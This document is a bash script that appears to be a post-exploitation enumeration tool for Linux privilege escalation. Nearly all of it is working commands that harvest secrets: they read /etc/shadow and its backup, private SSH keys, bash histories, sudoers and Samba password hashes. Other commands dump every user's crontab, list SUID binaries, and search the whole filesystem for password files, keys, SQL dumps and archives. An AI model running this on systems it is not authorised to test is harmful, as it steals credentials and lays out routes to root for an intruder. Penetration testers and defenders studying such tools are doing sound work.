#!/bin/bash -v
HOME_DIR=`pwd`

echo '******* SYSTEM INFORMATION *******'
uname -a
lsb_release -a
arch
ps aux
cat /etc/issue
ls /home
cat /etc/passwd
cat /etc/shadow
cat /etc/hosts
cat /etc/resolv.conf
cat /etc/motd
cat /etc/crontab
mount 
df -ah

cat /proc/cpuinfo
cat /proc/meminfo
w
who -a
id
free -m

ls /etc/init.d/


gcc -v
mysql --version
python --version
#perl --version
#ruby -v
last -a
dmesg
which nmap
which nc

echo '******* USER INFORMATION *******'
#ls -d *
#ls -d .*/
ls  $HOME_DIR/.ssh
cat $HOME_DIR/.ssh/id_rsa
cat $HOME_DIR/.ssh/id_rsa.pub
cat $HOME_DIR/.ssh/known_hosts
cat $HOME_DIR/.ssh/authorized_keys
echo '>>>HISTORY FILE' 
cat $HOME_DIR/.bash_history
echo '<<< HISTORY FILE' 
## find . -type f -print -name 'id_rsa' -o -name 'id_rsa.pub' -o -iname '*password*' -exec cat {} \;
set
env
echo '******* NETWORK INFORMATION *******'
/sbin/ifconfig -a
netstat -nr
netstat -natup
arp -a
/sbin/iptables-save
/sbin/iptables -L
hostname
hostname -f
curl --connect-timeout 5 ifconfig.me
lsof -nPi
cat /etc/network/interfaces

echo '******* CONFIGURATION *******'
ls -aRl /etc/ | awk '$1 ~ /w.$/' | grep -v lrwx 2>/dev/null
cat /etc/issue{,.net}
cat /etc/passwd
cat /etc/shadow # (gotta try..)
cat /etc/shadow~ # (sometimes there when edited with gedit)
cat /etc/master.passwd
cat /etc/group
cat /etc/hosts
cat /etc/crontab
cat /etc/sysctl.conf
for user in $(cut -f1 -d: /etc/passwd); do echo $user; crontab -u $user -l; done
cat /etc/resolv.conf
cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /opt/lampp/etc/httpd.conf
cat /etc/samba/smb.conf
cat /etc/openldap/ldap.conf
cat /etc/ldap/ldap.conf
pdbedit -L -w
pdbedit -L -v
cat /etc/exports
cat /etc/auto.master
cat /etc/auto_master
cat /etc/fstab
find /etc/sysconfig/ -type f -exec cat {} \;
cat /etc/sudoers

echo '******* DISTRO *******'
lsb_release -d # Generic for all LSB distros
cat /etc/*release
#/etc/SUSE-release # Novell SUSE
#/etc/redhat-release, /etc/redhat_version # Red Hat
#/etc/fedora-release # Fedora
#/etc/slackware-release, /etc/slackware-version # Slackware
#/etc/debian_release, /etc/debian_version, # Debian
#/etc/mandrake-release # Mandrake
#/etc/sun-release # Sun JDS
#/etc/release # Solaris/Sparc
#/etc/gentoo-release # Gentoo
#/etc/lsb-release # ubuntu
#/etc/rc.conf # arch linux
arch # on OpenBSD sample: OpenBSD.amd64
uname -a # (often hints at it pretty well)

#echo '******* Packages ******'
#rpm -qa --last | head
#yum list | grep installed
#dpkg -l
#dpkg -l |grep -i “linux-image”
#pkg_info # FreeBSD
#

echo '******* IMPORTANT FILES ******'
find /var/log -type f -exec ls -la {} \;
ls -alhtr /mnt
ls -alhtr /media
ls -alhtr /tmp
#ls -alhtr /home
#cd /home/; tree
ls /home/*/.ssh/*
echo '>>>Home's scripts'
cat /home/*/*.sh
echo '<<<Home's scripts'

#find /home -type f -iname '*.sh' -print -exec cat {} \;
find /home -type f -name 'id_rsa' -o -name 'id_rsa.pub' -o -iname '*.sh' -o -iname '*password*' -print;
find /home -type f -iname '.*history'
ls -lart /etc/rc.d/
#locate tar | grep [.]tar$
#locate tgz | grep [.]tgz$
#locate sql | grep [.]sql$
locate settings | grep [.]php$
locate config.inc | grep [.]php$
ls /home/*/id*
locate .properties | grep [.]properties # java config files
locate .xml | grep [.]xml # java/.net config files
find /sbin /usr/sbin /opt /lib `echo $PATH | 'sed s/:/ /g'` -perm -4000 # find suids
locate rhosts
# find / -type f -print -name 'id_rsa' -o -iname '*password*' -o -iname '*.sh' -exec cat {} \;
find / -nowarn -ignore_readdir_race -iname '*.sql' -o -iname '*.conf' -o -iname '*config*' -o -name '.git' -o -name '.svn' \
	-o -name '*.tar' -o -name '*.gz' -o -name '*.bz2' -o -name '*.zip' -o -name '*.7z' -o -name '*.rar' 2>/dev/null

